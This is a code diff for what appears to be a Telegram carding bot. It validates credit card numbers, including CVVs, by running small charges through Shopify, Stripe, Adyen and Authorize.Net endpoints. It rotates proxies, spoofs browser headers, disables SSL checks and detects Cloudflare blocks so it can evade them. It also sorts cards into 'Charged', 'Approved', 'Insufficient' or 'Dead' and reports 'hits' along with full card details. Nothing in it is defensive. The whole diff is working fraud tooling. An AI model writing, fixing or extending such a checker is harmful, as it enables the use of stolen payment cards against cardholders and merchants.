+                return {'status': 'Site Error', 'message': f'HTTP 404 - Not Found', 'card': card}
+            if resp.status == 504:
+                return {'status': 'Site Error', 'message': f'HTTP 504 - Gateway Timeout', 'card': card}
+            if resp.status == 505:
+                return {'status': 'Site Error', 'message': f'HTTP 505 - Version Not Supported', 'card': card}
+            if resp.status in [500, 501, 502, 503]:
+                return {'status': 'Site Error', 'message': f'HTTP {resp.status} - Server Error', 'card': card}
+            if resp.status == 429:
+                return {'status': 'Site Error', 'message': f'HTTP 429 - Rate Limited', 'card': card}
+            if resp.status == 403:
+                return {'status': 'Site Error', 'message': f'HTTP 403 - Forbidden', 'card': card}
+            if resp.status == 401:
+                return {'status': 'Site Error', 'message': f'HTTP 401 - Unauthorized', 'card': card}
+            if resp.status == 400:
+                return {'status': 'Site Error', 'message': f'HTTP 400 - Bad Request', 'card': card}
+            if resp.status == 422:
+                return {'status': 'Site Error', 'message': f'HTTP 422 - Unprocessable', 'card': card}
+
+            # Cloudflare / HTML block
+            if "<html" in text_data.lower() and any(k in text_data.lower() for k in ["cloudflare", "just a moment", "challenge", "captcha", "ddos"]):
+                return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
+
+            # Empty response
+            if not text_data or not text_data.strip():
+                return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
+
+            gt = "Shopify"
+            pr = None
+            rm = text_data.strip()
+            api_status = None
+
+            try:
+                rj = json.loads(text_data)
+                # Extract the response message from API
+                rm = str(rj.get('response_msg',
+                         rj.get('result',
+                         rj.get('Response',
+                         rj.get('message',
+                         rj.get('error',
+                         rj.get('msg',
+                         rj.get('status',
+                         rj.get('data', ''))))))))).strip()
+
+                # Extract gateway name
+                gt = rj.get('Gateway', rj.get('gateway', 'Shopify'))
+
+                # Extract price
+                for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged', 'charge', 'total']:
+                    if k in rj and rj[k] is not None and str(rj[k]).strip():
+                        pr = str(rj[k]).strip()
+                        break
+
+                # Extract API status field if exists
+                api_status = str(rj.get('status', rj.get('Status', ''))).lower().strip()
+
+            except Exception:
+                pass
+
+            # If we got valid JSON with a status field, trust it
+            if api_status:
+                if api_status in ['charged', 'approved', 'success', 'succeeded', 'completed', 'captured', 'paid']:
+                    return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+                if api_status in ['declined', 'dead', 'rejected', 'denied', 'failed']:
+                    return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+                if api_status in ['insufficient', 'insufficient_funds', 'nsf']:
+                    return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+                if api_status in ['site_error', 'error', 'timeout', 'unreachable']:
+                    return {'status': 'Site Error', 'message': rm, 'card': card}
+
+            clean_rm = unsf(rm).lower().strip()
+
+            # CHARGED - only if API explicitly says charged/success
+            if any(k in clean_rm for k in ['charged', 'payment succeeded', 'success', 'captured', 'approved', 'completed']):
+                if 'not charged' in clean_rm or 'declined' in clean_rm:
+                    return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
+            # APPROVED - CVV match / AVS
+            if any(k in clean_rm for k in ['cvv match', 'avs', 'security code match', 'cvv correct']):
+                return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
+            # INSUFFICIENT FUNDS
+            if any(k in clean_rm for k in ['insufficient funds', 'not enough funds', 'low balance']):
+                return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
+            # DEAD - declined by bank
+            if any(k in clean_rm for k in ['declined', 'do not honor', 'pick up card', 'stolen', 'lost', 'fraud',
+                                            'expired', 'invalid number', 'invalid card', 'call issuer',
+                                            'not permitted', 'not allowed', 'restricted']):
+                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
+            # SITE ERROR - gateway/site issues
+            if any(k in clean_rm for k in ['site error', 'gateway error', 'not shopify', 'cart failed',
+                                            'step 0', 'step 1', 'session error', 'max retries',
+                                            'requires login', 'login required', 'format error']):
+                return {'status': 'Site Error', 'message': rm, 'card': card}
+
+            # Unknown but valid response = Dead (bank declined, not our fault)
+            if len(clean_rm) < 3:
+                return {'status': 'Site Error', 'message': rm or 'Empty/Invalid Response', 'card': card}
+
+            return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card}
+    except aiohttp.ClientError as e:
+        return {'status': 'Site Error', 'message': f'Connection Error: {str(e)[:30]}', 'card': card}
     except Exception as e:
         return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}
 
+# Adyen Triumph Gate
 async def check_adyen_api(card, proxy, session):
     try:
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
         card = str(card).strip()
         req_url = f"{ADYEN_API_URL}?card={quote(card)}"
-        status_code, text_data = await _api_request_with_retry(
-            session, req_url, proxy_url, max_retries=RETRY_ATTEMPTS, timeout=API_TIMEOUT
-        )
-        if status_code == 0:
-            return {'status': 'Site Error', 'message': text_data, 'card': card}
-        if status_code in [500, 502, 503, 504]:
-            return {'status': 'Site Error', 'message': f'Server Error {status_code}', 'card': card}
-        if _check_cloudflare_block(text_data):
-            return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
-        if not text_data or not text_data.strip():
-            return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
-        rm, gt, pr, api_status = _parse_api_response(text_data)
-        clean_rm = unsf(rm).lower().strip()
-        if 'internal error' in clean_rm or 'internal server error' in clean_rm:
-            return {'status': 'Site Error', 'message': rm, 'card': card}
-        status, price = _determine_status(clean_rm, api_status, gt or 'Adyen', pr)
-        if status == 'Site Error':
-            return {'status': 'Site Error', 'message': rm or 'Unknown Error', 'card': card}
-        return {'status': status, 'message': rm, 'card': card, 'gateway': gt or 'Adyen', 'price': price or '-'}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Accept": "application/json",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "keep-alive"
+        }
+        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT, ssl=False) as resp:
+            text_data = await resp.text()
+            if resp.status in [500, 502, 503, 504]:
+                return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card}
+            if "<html" in text_data.lower() and any(k in text_data.lower() for k in ["cloudflare", "just a moment", "challenge", "captcha", "ddos"]):
+                return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
+            if not text_data or not text_data.strip():
+                return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
+            gt = "Adyen"
+            pr = None
+            rm = text_data.strip()
+            try:
+                rj = json.loads(text_data)
+                rm = str(rj.get('response_msg',
+                         rj.get('result',
+                         rj.get('Response',
+                         rj.get('message',
+                         rj.get('error',
+                         rj.get('msg',
+                         rj.get('status',
+                         rj.get('data', ''))))))))).strip()
+                gt = rj.get('Gateway', rj.get('gateway', 'Adyen'))
+                for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged', 'charge', 'total']:
+                    if k in rj and rj[k] is not None and str(rj[k]).strip():
+                        pr = str(rj[k]).strip()
+                        break
+            except Exception:
+                pass
+            clean_rm = unsf(rm).lower().strip()
+
+            # CHARGED / AUTHORISED
+            charged_keywords = [
+                'authorised', 'authorized', 'success', 'payment completed', 'transaction completed',
+                'approved', 'accepted', 'payment successful', 'charge complete', 'captured',
+                'settled', 'completed', 'payment confirmed', 'order confirmed', 'paid'
+            ]
+            if any(k in clean_rm for k in charged_keywords):
+                if 'not authorised' in clean_rm or 'declined' in clean_rm or 'refused' in clean_rm:
+                    return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
+            # APPROVED (CVV Match / AVS / 3D related but approved)
+            approved_keywords = [
+                'cvv match', 'security code', 'invalid_cvv', 'incorrect_cvv', 'cvv correct',
+                'avs', 'address verification', 'cvv2', 'cid', 'match', 'cvv declined',
+                'avs declined', '3d authenticated', 'challenge completed', 'identifyshopper'
+            ]
+            if any(k in clean_rm for k in approved_keywords):
+                return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
+            # INSUFFICIENT FUNDS
+            insufficient_keywords = [
+                'insufficient', 'funds', 'balance', 'low balance', 'not enough',
+                'limit exceeded', 'over limit', 'exceeds', 'nsf', 'not sufficient',
+                'insufficient_funds', 'no money', 'low funds'
+            ]
+            if any(k in clean_rm for k in insufficient_keywords):
+                return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
+            # DEAD / REFUSED
+            dead_keywords = [
+                'refused', 'declined', 'do not honor', 'pick up card', 'stolen', 'lost', 'fraud',
+                'not allowed', 'expired', 'invalid card', 'invalid number', 'call issuer',
+                'authentication_required', '3d secure', 'otp required', 'challenge',
+                'incorrect', 'wrong', 'denied', 'rejected', 'blocked', 'banned',
+                'unauthorized', 'forbidden', 'invalid cvv', 'invalid expiry',
+                'acquirer fraud', 'shopper fraud', 'risk', 'not supported',
+                'unsupported', 'cancelled', 'canceled', 'abandoned', 'error',
+                'payment error', 'transaction error', 'processing error'
+            ]
+            if any(k in clean_rm for k in dead_keywords):
+                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
+            # SITE ERROR
+            site_error_keywords = [
+                'timeout', 'connection', 'unreachable', 'refused', 'gateway error',
+                'server error', 'internal error', 'service unavailable', 'bad gateway',
+                'empty response', 'no response', 'format error', 'parse error',
+                'invalid request', 'missing parameter', 'required field'
+            ]
+            if any(k in clean_rm for k in site_error_keywords):
+                return {'status': 'Site Error', 'message': rm, 'card': card}
+
+            if len(clean_rm) < 5 or clean_rm in ['ok', 'done', 'yes', 'true']:
+                return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': gt, 'price': pr or '-'}
+            return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card}
+    except aiohttp.ClientError as e:
+        return {'status': 'Site Error', 'message': f'Connection Error: {str(e)[:30]}', 'card': card}
     except Exception as e:
         return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}
 
+# Stripe Gospel-Piano Gate - $1 Charge
 STRIPE_PRICE = "$1.00"
 
 async def check_stripe_api(card, proxy, session):
@@ -735,23 +953,104 @@ async def check_stripe_api(card, proxy, session):
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
         card = str(card).strip()
         req_url = f"{STRIPE_API_URL}?card={quote(card)}"
-        status_code, text_data = await _api_request_with_retry(
-            session, req_url, proxy_url, max_retries=RETRY_ATTEMPTS, timeout=API_TIMEOUT
-        )
-        if status_code == 0:
-            return {'status': 'Site Error', 'message': text_data, 'card': card}
-        if status_code in [500, 502, 503, 504]:
-            return {'status': 'Site Error', 'message': f'Server Error {status_code}', 'card': card}
-        if _check_cloudflare_block(text_data):
-            return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
-        if not text_data or not text_data.strip():
-            return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
-        rm, gt, pr, api_status = _parse_api_response(text_data)
-        clean_rm = unsf(rm).lower().strip()
-        status, price = _determine_status(clean_rm, api_status, gt or 'Stripe', pr or STRIPE_PRICE)
-        if status == 'Site Error':
-            return {'status': 'Site Error', 'message': rm or 'Unknown Error', 'card': card}
-        return {'status': status, 'message': rm, 'card': card, 'gateway': gt or 'Stripe', 'price': price or STRIPE_PRICE}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Accept": "application/json",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "keep-alive"
+        }
+        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT, ssl=False) as resp:
+            text_data = await resp.text()
+            if resp.status in [500, 502, 503, 504]:
+                return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card}
+            if "<html" in text_data.lower() and any(k in text_data.lower() for k in ["cloudflare", "just a moment", "challenge", "captcha", "ddos"]):
+                return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
+            if not text_data or not text_data.strip():
+                return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
+            gt = "Stripe"
+            pr = STRIPE_PRICE
+            rm = text_data.strip()
+            try:
+                rj = json.loads(text_data)
+                rm = str(rj.get('response_msg',
+                         rj.get('result',
+                         rj.get('Response',
+                         rj.get('message',
+                         rj.get('error',
+                         rj.get('msg',
+                         rj.get('status',
+                         rj.get('data', ''))))))))).strip()
+                gt = rj.get('Gateway', rj.get('gateway', 'Stripe'))
+                for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged', 'charge', 'total']:
+                    if k in rj and rj[k] is not None and str(rj[k]).strip():
+                        pr = str(rj[k]).strip()
+                        break
+            except Exception:
+                pass
+            clean_rm = unsf(rm).lower().strip()
+
+            # CHARGED / SUCCEEDED
+            charged_keywords = [
+                'succeeded', 'success', 'payment succeeded', 'charged', 'completed',
+                'approved', 'transaction approved', 'payment complete', 'charge complete',
+                'payment successful', 'order confirmed', 'captured', 'settled',
+                'paid', 'payment confirmed', 'charge confirmed'
+            ]
+            if any(k in clean_rm for k in charged_keywords):
+                if 'not charged' in clean_rm or 'declined' in clean_rm:
+                    return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+
+            # APPROVED (CVV Match / AVS)
+            approved_keywords = [
+                'cvv match', 'security code', 'invalid_cvv', 'incorrect_cvv', 'cvv correct',
+                'avs', 'address verification', 'cvv2', 'cid', 'match', 'incorrect_cvc',
+                'invalid_cvc', 'cvc_check', 'cvv_check', 'zip_check'
+            ]
+            if any(k in clean_rm for k in approved_keywords):
+                return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+
+            # INSUFFICIENT FUNDS
+            insufficient_keywords = [
+                'insufficient', 'funds', 'balance', 'low balance', 'not enough',
+                'limit exceeded', 'over limit', 'exceeds', 'nsf', 'not sufficient',
+                'insufficient_funds', 'no money', 'low funds'
+            ]
+            if any(k in clean_rm for k in insufficient_keywords):
+                return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+
+            # DEAD / DECLINED
+            dead_keywords = [
+                'declined', 'do not honor', 'pick up card', 'stolen', 'lost', 'fraud',
+                'not allowed', 'expired', 'processor_declined', 'card_declined',
+                'invalid account', 'invalid number', 'call issuer',
+                'authentication_required', '3d secure', 'otp required', 'challenge',
+                'incorrect', 'wrong', 'denied', 'rejected', 'blocked', 'banned',
+                'unauthorized', 'forbidden', 'invalid cvv', 'invalid expiry',
+                'processing_error', 'processing error', 'gateway error',
+                'issuer_declined', 'issuer declined', 'not permitted'
+            ]
+            if any(k in clean_rm for k in dead_keywords):
+                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+
+            # SITE ERROR
+            site_error_keywords = [
+                'timeout', 'connection', 'unreachable', 'refused', 'gateway error',
+                'server error', 'internal error', 'service unavailable', 'bad gateway',
+                'empty response', 'no response', 'format error', 'parse error',
+                'invalid request', 'missing parameter', 'required field',
+                'rate limit', 'too many requests', 'api error'
+            ]
+            if any(k in clean_rm for k in site_error_keywords):
+                return {'status': 'Site Error', 'message': rm, 'card': card}
+
+            if len(clean_rm) < 5 or clean_rm in ['ok', 'done', 'yes', 'true']:
+                return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': gt, 'price': pr}
+            return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card}
+    except aiohttp.ClientError as e:
+        return {'status': 'Site Error', 'message': f'Connection Error: {str(e)[:30]}', 'card': card}
     except Exception as e:
         return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}
 
@@ -762,24 +1061,45 @@ async def check_authnet_api(card, proxy, session):
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
         card = str(card).strip()
         req_url = f"{AUTHNET_API_URL}?cc={quote(card)}&amount=20&amt=20&price=20"
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json"}
-        status_code, text_data = await _api_request_with_retry(
-            session, req_url, proxy_url, headers=headers, max_retries=RETRY_ATTEMPTS, timeout=API_TIMEOUT
-        )
-        if status_code == 0:
-            return {'status': 'Site Error', 'message': text_data, 'card': card}
-        if status_code in [500, 502, 503, 504]:
-            return {'status': 'Site Error', 'message': f'Server Error {status_code}', 'card': card}
-        if _check_cloudflare_block(text_data):
-            return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
-        if not text_data or not text_data.strip():
-            return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
-        rm, gt, pr, api_status = _parse_api_response(text_data)
-        clean_rm = unsf(rm).lower().strip()
-        status, price = _determine_status(clean_rm, api_status, gt or 'Authorize.Net', pr or AUTHNET_PRICE)
-        if status == 'Site Error':
-            return {'status': 'Site Error', 'message': rm or 'Unknown Error', 'card': card}
-        return {'status': status, 'message': rm, 'card': card, 'gateway': gt or 'Authorize.Net', 'price': price or AUTHNET_PRICE}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json"
+        }
+        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT, ssl=False) as resp:
+            text_data = await resp.text()
+            if resp.status in [500, 502, 503, 504]:
+                return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card}
+            if "<html" in text_data.lower():
+                return {'status': 'Site Error', 'message': 'HTML Blocked', 'card': card}
+            if not text_data.strip():
+                return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
+            rm = text_data.strip()
+            try:
+                rj = json.loads(text_data)
+                rm = str(rj.get('response_msg',
+                         rj.get('result',
+                         rj.get('Response',
+                         rj.get('message',
+                         rj.get('error',
+                         rj.get('msg',
+                         rj.get('status', text_data)))))))).strip()
+            except Exception:
+                pass
+            clean_rm = unsf(rm).lower().strip()
+            if any(k in clean_rm for k in ['this transaction has been approved', 'charged', 'success', 'payment succeeded', 'completed', 'approved']):
+                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': AUTHNET_PRICE}
+            if any(k in clean_rm for k in ['insufficient funds', 'insufficient_funds', 'funds', 'balance', 'low balance', 'nsf']):
+                return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': AUTHNET_PRICE}
+            if any(k in clean_rm for k in ['declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number',
+                                            'suspected fraud', 'card code is invalid', 'authentication_required', '3d secure']):
+                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': AUTHNET_PRICE}
+            if any(k in clean_rm for k in ['error', 'failed', 'timeout', 'connection', 'unreachable', 'not found']):
+                return {'status': 'Site Error', 'message': rm, 'card': card}
+            return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': 'Authorize.Net', 'price': AUTHNET_PRICE}
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card}
+    except aiohttp.ClientError as e:
+        return {'status': 'Site Error', 'message': f'Connection Error: {str(e)[:30]}', 'card': card}
     except Exception as e:
         return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}
 
@@ -787,22 +1107,27 @@ async def check_proxy_real(proxy_dict, session, test_card=TEST_CARD, timeout=15)
     proxy_url = proxy_dict.get('proxy_url') if isinstance(proxy_dict, dict) else proxy_dict
     if not proxy_url:
         return False, "No proxy URL"
+
+    # Test endpoints - multiple fallbacks
     test_urls = [
         "https://httpbin.org/get",
         "https://api.ipify.org?format=json",
         "https://www.google.com/generate_204",
     ]
+
     for url in test_urls:
         try:
             async with session.get(
-                url,
-                proxy=proxy_url,
+                url, 
+                proxy=proxy_url, 
                 timeout=aiohttp.ClientTimeout(total=timeout),
                 ssl=False
             ) as r:
+                # ANY HTTP response = proxy is working
+                # Even 407 (auth required), 403 (blocked), 404, 500 = proxy routes traffic
                 return True, f"Proxy Working ({r.status})"
         except asyncio.TimeoutError:
-            continue
+            continue  # Try next URL
         except aiohttp.ClientProxyConnectionError:
             return False, "Cannot Connect to Proxy"
         except aiohttp.ClientHttpProxyError as e:
@@ -812,11 +1137,17 @@ async def check_proxy_real(proxy_dict, session, test_card=TEST_CARD, timeout=15)
             return False, f"Proxy Auth Error ({status})"
         except Exception as e:
             err = str(e).lower()
+            # Connection refused, reset, unreachable = proxy dead
             if any(x in err for x in ['refused', 'reset', 'unreachable', 'closed', 'abort']):
                 return False, f"Proxy Dead: {str(e)[:40]}"
+            # DNS, timeout, network errors = try next URL
             if any(x in err for x in ['dns', 'resolve', 'name', 'host']):
                 continue
+            # Other errors might be target-related, not proxy-related
+            # Try next URL to be sure
             continue
+
+    # All URLs failed - proxy is likely dead or extremely slow
     return False, "Proxy Unresponsive (All checks failed)"
 
 async def check_gate_real(site, proxy_url, session, test_card=TEST_CARD, timeout=15):
@@ -876,158 +1207,78 @@ class CPMController:
             self.last_request_time = time.time()
             self.request_times.append(self.last_request_time)
 
-# ==================== PROXY ROTATION & CIRCUIT BREAKER ====================
-
-class ProxyRotator:
-    def __init__(self, proxies):
-        self.proxies = list(proxies) if proxies else []
-        self.index = 0
-        self.lock = asyncio.Lock()
-
-    async def get_next(self):
-        async with self.lock:
-            if not self.proxies:
-                return None
-            proxy = self.proxies[self.index]
-            self.index = (self.index + 1) % len(self.proxies)
-            return proxy
-
-    def get_random(self):
-        if not self.proxies:
-            return None
-        return random.choice(self.proxies)
-
-class CircuitBreaker:
-    def __init__(self, threshold=5, timeout=60):
-        self.failures = 0
-        self.threshold = threshold
-        self.timeout = timeout
-        self.last_failure = 0
-        self.state = 'CLOSED'  # CLOSED, OPEN, HALF_OPEN
-        self.lock = asyncio.Lock()
-
-    async def call(self, func, *args, **kwargs):
-        async with self.lock:
-            if self.state == 'OPEN':
-                if time.time() - self.last_failure > self.timeout:
-                    self.state = 'HALF_OPEN'
-                    self.failures = 0
-                else:
-                    return {'status': 'Site Error', 'message': 'Circuit Breaker Open', 'card': args[0] if args else ''}
-
-        try:
-            result = await func(*args, **kwargs)
-            async with self.lock:
-                if self.state == 'HALF_OPEN':
-                    self.state = 'CLOSED'
-                    self.failures = 0
-            return result
-        except Exception:
-            async with self.lock:
-                self.failures += 1
-                self.last_failure = time.time()
-                if self.failures >= self.threshold:
-                    self.state = 'OPEN'
-            raise
-
 async def check_card_real(card, sites, proxies, session, gateway_name, uid):
-    # Get or create circuit breaker for this gateway
-    cb_key = f"{uid}_{gateway_name}"
-    if cb_key not in _CIRCUIT_BREAKERS:
-        _CIRCUIT_BREAKERS[cb_key] = CircuitBreaker(threshold=5, timeout=30)
-
-    cb = _CIRCUIT_BREAKERS[cb_key]
+    p_dict = random.choice(proxies) if proxies else None
+    p_url = p_dict['proxy_url'] if p_dict else None
 
     if gateway_name == "Shopify":
         if not sites:
             sites = ["touch-of-finland.myshopify.com"]
+
+        # Shuffle sites for random order
         sites_shuffled = list(sites)
         random.shuffle(sites_shuffled)
+
         last_error = "All sites failed"
 
         for s_target in sites_shuffled:
-            # Try with different proxies up to 3 times
-            for attempt in range(min(3, len(proxies) if proxies else 1)):
-                p_dict = None
-                if proxies:
-                    p_dict = proxies[attempt % len(proxies)]
-                p_url = p_dict['proxy_url'] if p_dict else None
+            # Try with current proxy
+            res = await check_shopify_api(SHOPIFY_API_URL_1, card, s_target, p_url, session)
+            status = res.get('status')
 
-                try:
-                    res = await cb.call(check_shopify_api, SHOPIFY_API_URL_1, card, s_target, p_dict, session)
-                    status = res.get('status')
-                    if status != 'Site Error':
-                        return res
-                    last_error = res.get('message', 'Site Error')
-                except Exception as e:
-                    last_error = str(e)[:30]
-                    continue
-            # Site exhausted, try next
+            # If response is not Site Error, return it immediately
+            if status != 'Site Error':
+                return res
+
+            # Site Error - save the message and try next site
+            last_error = res.get('message', 'Site Error')
+
+            # Try with different proxy on same site
+            if proxies and len(proxies) > 1:
+                p_dict2 = random.choice([p for p in proxies if p != p_dict])
+                p_url2 = p_dict2['proxy_url'] if p_dict2 else None
+                res2 = await check_shopify_api(SHOPIFY_API_URL_1, card, s_target, p_url2, session)
+                status2 = res2.get('status')
+                if status2 != 'Site Error':
+                    return res2
+                last_error = res2.get('message', 'Site Error')
+
+            # Still Site Error? Skip this site and try next one
             continue
+
+        # All sites exhausted - return last error
         return {'status': 'Site Error', 'message': last_error, 'card': card, 'gateway': gateway_name, 'price': '-'}
 
     else:
-        # Non-Shopify gateways with retry
-        last_error = "Gateway failed"
-        for attempt in range(min(RETRY_ATTEMPTS, len(proxies) if proxies else RETRY_ATTEMPTS)):
-            p_dict = None
-            if proxies:
-                p_dict = proxies[attempt % len(proxies)]
-            p_url = p_dict['proxy_url'] if p_dict else None
+        try:
+            if gateway_name == "AuthNet":
+                res = await check_authnet_api(card, p_url, session)
+            elif gateway_name == "Adyen":
+                res = await check_adyen_api(card, p_url, session)
+            elif gateway_name == "Stripe":
+                res = await check_stripe_api(card, p_url, session)
+            else:
+                return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
 
-            try:
-                if gateway_name == "AuthNet":
-                    res = await cb.call(check_authnet_api, card, p_dict, session)
-                elif gateway_name == "Adyen":
-                    res = await cb.call(check_adyen_api, card, p_dict, session)
-                elif gateway_name == "Stripe":
-                    res = await cb.call(check_stripe_api, card, p_dict, session)
-                else:
-                    return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
+            status = res.get('status')
+            # Retry once with different proxy on Site Error
+            if status == 'Site Error':
+                if proxies and len(proxies) > 1:
+                    p_dict2 = random.choice([p for p in proxies if p != p_dict])
+                    p_url2 = p_dict2['proxy_url'] if p_dict2 else None
+                    if gateway_name == "AuthNet":
+                        res = await check_authnet_api(card, p_url2, session)
+                    elif gateway_name == "Adyen":
+                        res = await check_adyen_api(card, p_url2, session)
+                    elif gateway_name == "Stripe":
+                        res = await check_stripe_api(card, p_url2, session)
+                    status = res.get('status')
 
-                status = res.get('status')
-                if status != 'Site Error':
-                    return res
-                last_error = res.get('message', 'Site Error')
-
-                # If we got internal error, wait a bit before retry
-                msg_lower = str(res.get('message', '')).lower()
-                if 'internal' in msg_lower or 'rate' in msg_lower:
-                    await asyncio.sleep(0.5 * (attempt + 1))
-
-            except Exception as e:
-                last_error = str(e)[:30]
-                continue
-
-        return {'status': 'Site Error', 'message': last_error, 'card': card, 'gateway': gateway_name, 'price': '-'}
-
-def format_card_result(card, gateway, price, bin_info, elapsed):
-    c = card.split("|")
-    cc = c[0] if len(c) > 0 else "-"
-    mm = c[1] if len(c) > 1 else "-"
-    yy = c[2] if len(c) > 2 else "-"
-    cvv = c[3] if len(c) > 3 else "-"
-    brand = bin_info.get("brand", "-")
-    ctype = bin_info.get("type", "-")
-    level = bin_info.get("level", "-")
-    bank = bin_info.get("bank", "-")
-    country = bin_info.get("country", "-")
-    flag = bin_info.get("flag", "")
-    elapsed_str = f"{elapsed:.2f}s"
-    return f"""<b>{CE_CROWN} {sf('HIT DETECTED')} {CE_CROWN}</b>
-
-<b>{CE_CARD} {sf('Card')}:</b> <code>{sf(cc)}|{sf(mm)}|{sf(yy)}|{sf(cvv)}</code>
-<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>
-<b>{CE_CASH} {sf('Price')}:</b> <code>{sf(price)}</code>
-<b>{CE_FLASH} {sf('Speed')}:</b> <code>{sf(elapsed_str)}</code>
-
-<b>{CE_GEAR} {sf('BIN Info')}:</b>
-├ <b>{sf('Brand')}:</b> <code>{sf(brand)}</code>
-├ <b>{sf('Type')}:</b> <code>{sf(ctype)}</code>
-├ <b>{sf('Level')}:</b> <code>{sf(level)}</code>
-├ <b>{sf('Bank')}:</b> <code>{sf(bank)}</code>
-╰ <b>{sf('Country')}:</b> <code>{sf(country)}</code> {flag}"""
-
+            if status == 'Site Error':
+                return {'status': 'Site Error', 'message': res.get('message', 'Gateway Failed'), 'card': card, 'gateway': gateway_name, 'price': '-'}
+            return res
+        except Exception as e:
+            return {'status': 'Site Error', 'message': f'Check Failed: {str(e)[:30]}', 'card': card, 'gateway': gateway_name, 'price': '-'}
 async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
     await asyncio.sleep(HIT_DELAY)
     try:
@@ -1100,7 +1351,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         if cmd in ["start", "cmds", "commands"]:
             if _MAINTENANCE_MODE and uid not in ADMIN_ID:
